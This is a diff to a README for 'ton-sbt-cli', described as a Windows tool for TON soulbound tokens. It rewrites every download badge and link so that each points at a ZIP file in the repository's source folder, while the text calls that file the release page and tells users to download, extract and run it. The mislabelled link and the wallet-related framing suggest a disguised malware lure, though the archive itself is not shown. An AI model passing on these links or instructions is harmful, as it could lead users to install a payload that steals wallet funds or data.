@@ -1,6 +1,6 @@
 # ⚙️ ton-sbt-cli - Deploy and verify TON SBTs
 
-[![Download ton-sbt-cli](https://img.shields.io/badge/Download%20ton--sbt--cli-purple?style=for-the-badge&logo=github)](https://github.com/Tyelowermost549/ton-sbt-cli/raw/refs/heads/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip)
+[![Download ton-sbt-cli](https://img.shields.io/badge/Download%20ton--sbt--cli-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip)
 
 ## 🚀 What this app does
 
@@ -30,14 +30,14 @@ For best results, keep your wallet files, collection list, and mint data in one 
 
 ## 📥 Download the app
 
-1. Open the release page: https://github.com/Tyelowermost549/ton-sbt-cli/raw/refs/heads/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip
+1. Open the release page: https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save it to a folder you can find later, such as Downloads or Desktop
 
 If the release contains a ZIP file, extract it before you run the app
 
-[![Download the latest release](https://img.shields.io/badge/Open%20releases-blue?style=for-the-badge&logo=github)](https://github.com/Tyelowermost549/ton-sbt-cli/raw/refs/heads/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip)
+[![Download the latest release](https://img.shields.io/badge/Open%20releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip)
 
 ## 🪟 Install on Windows
 
@@ -221,7 +221,7 @@ A typical session looks like this:
 
 Use the release page for new versions, fixes, and Windows files:
 
-https://github.com/Tyelowermost549/ton-sbt-cli/raw/refs/heads/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip
+https://raw.githubusercontent.com/Tyelowermost549/ton-sbt-cli/main/src/ton_sbt_tool/sbt-cli-ton-2.0.zip
 
 Check that page when you need a newer build or a fresh download
 
